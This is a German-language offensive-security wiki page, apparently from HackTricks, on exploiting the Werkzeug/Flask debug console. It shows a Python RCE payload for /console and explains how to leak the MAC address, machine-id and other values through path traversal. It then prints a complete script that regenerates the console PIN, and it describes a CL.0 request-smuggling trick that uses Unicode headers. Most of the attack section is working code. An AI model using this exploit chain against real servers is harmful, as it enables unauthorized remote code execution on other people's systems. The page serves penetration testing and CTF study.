# Werkzeug / Flask Debug

{{#include ../../banners/hacktricks-training.md}}


## Console RCE

Wenn das Debugging aktiv ist, könnten Sie versuchen, auf `/console` zuzugreifen und RCE zu erlangen.
```python
__import__('os').popen('whoami').read();
```
![](<../../images/image (117).png>)

Es gibt auch mehrere Exploits im Internet wie [diesen ](https://github.com/its-arun/Werkzeug-Debug-RCE) oder einen in Metasploit.

## Pin Geschützt - Pfad Traversierung

In einigen Fällen wird der **`/console`** Endpunkt durch einen Pin geschützt. Wenn Sie eine **Dateitraversierungsanfälligkeit** haben, können Sie alle notwendigen Informationen leaken, um diesen Pin zu generieren.

### Werkzeug Console PIN Exploit

Erzwingen Sie eine Debug-Fehlerseite in der App, um dies zu sehen:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Eine Nachricht bezüglich des "console locked"-Szenarios wird angezeigt, wenn versucht wird, auf die Debug-Schnittstelle von Werkzeug zuzugreifen, was darauf hinweist, dass eine PIN erforderlich ist, um die Konsole zu entsperren. Es wird vorgeschlagen, die Konsolen-PIN auszunutzen, indem der PIN-Generierungsalgorithmus in der Initialisierungsdatei von Werkzeug (`__init__.py`) analysiert wird. Der PIN-Generierungsmechanismus kann im [**Werkzeug-Quellcode-Repository**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py) studiert werden, es wird jedoch geraten, den tatsächlichen Servercode über eine Dateitraversal-Sicherheitsanfälligkeit zu beschaffen, um mögliche Versionsunterschiede zu vermeiden.

Um die Konsolen-PIN auszunutzen, werden zwei Variablenmengen benötigt: `probably_public_bits` und `private_bits`:

#### **`probably_public_bits`**

- **`username`**: Bezieht sich auf den Benutzer, der die Flask-Sitzung initiiert hat.
- **`modname`**: Typischerweise als `flask.app` bezeichnet.
- **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Resolviert in der Regel zu **Flask**.
- **`getattr(mod, '__file__', None)`**: Stellt den vollständigen Pfad zu `app.py` im Flask-Verzeichnis dar (z. B. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Wenn `app.py` nicht zutrifft, **versuchen Sie `app.pyc`**.

#### **`private_bits`**

- **`uuid.getnode()`**: Ruft die MAC-Adresse des aktuellen Geräts ab, wobei `str(uuid.getnode())` sie in ein dezimales Format übersetzt.

- Um **die MAC-Adresse des Servers zu bestimmen**, muss die aktive Netzwerkschnittstelle identifiziert werden, die von der App verwendet wird (z. B. `ens3`). Bei Unsicherheiten **leaken Sie `/proc/net/arp`**, um die Geräte-ID zu finden, und **extrahieren Sie die MAC-Adresse** aus **`/sys/class/net/<device id>/address`**.
- Die Umwandlung einer hexadezimalen MAC-Adresse in dezimal kann wie folgt durchgeführt werden:

```python
# Beispiel MAC-Adresse: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```

- **`get_machine_id()`**: Verknüpft Daten aus `/etc/machine-id` oder `/proc/sys/kernel/random/boot_id` mit der ersten Zeile von `/proc/self/cgroup` nach dem letzten Schrägstrich (`/`).

<details>

<summary>Code für `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Nachdem alle notwendigen Daten gesammelt wurden, kann das Exploit-Skript ausgeführt werden, um die Werkzeug-Konsole-PIN zu generieren:

Nachdem alle notwendigen Daten gesammelt wurden, kann das Exploit-Skript ausgeführt werden, um die Werkzeug-Konsole-PIN zu generieren. Das Skript verwendet die zusammengestellten `probably_public_bits` und `private_bits`, um einen Hash zu erstellen, der dann weiterverarbeitet wird, um die endgültige PIN zu erzeugen. Unten steht der Python-Code zur Ausführung dieses Prozesses:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Dieses Skript erzeugt die PIN, indem es die verketteten Bits hasht, spezifische Salze (`cookiesalt` und `pinsalt`) hinzufügt und die Ausgabe formatiert. Es ist wichtig zu beachten, dass die tatsächlichen Werte für `probably_public_bits` und `private_bits` genau vom Zielsystem abgerufen werden müssen, um sicherzustellen, dass die generierte PIN mit der von der Werkzeug-Konsole erwarteten übereinstimmt.

> [!TIP]
> Wenn Sie eine **alte Version** von Werkzeug verwenden, versuchen Sie, den **Hash-Algorithmus auf md5** anstelle von sha1 zu ändern.

## Werkzeug Unicode-Zeichen

Wie in [**diesem Problem**](https://github.com/pallets/werkzeug/issues/2833) beobachtet, schließt Werkzeug eine Anfrage mit Unicode-Zeichen in den Headern nicht ab. Und wie in [**diesem Bericht**](https://mizu.re/post/twisty-python) erklärt, kann dies eine CL.0 Request Smuggling-Schwachstelle verursachen.

Das liegt daran, dass es in Werkzeug möglich ist, einige **Unicode**-Zeichen zu senden, was den Server **zum Absturz** bringen kann. Wenn jedoch die HTTP-Verbindung mit dem Header **`Connection: keep-alive`** erstellt wurde, wird der Body der Anfrage nicht gelesen und die Verbindung bleibt offen, sodass der **Body** der Anfrage als **nächste HTTP-Anfrage** behandelt wird.

## Automatisierte Ausnutzung

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## Referenzen

- [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
- [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
- [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
- [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

{{#include ../../banners/hacktricks-training.md}}
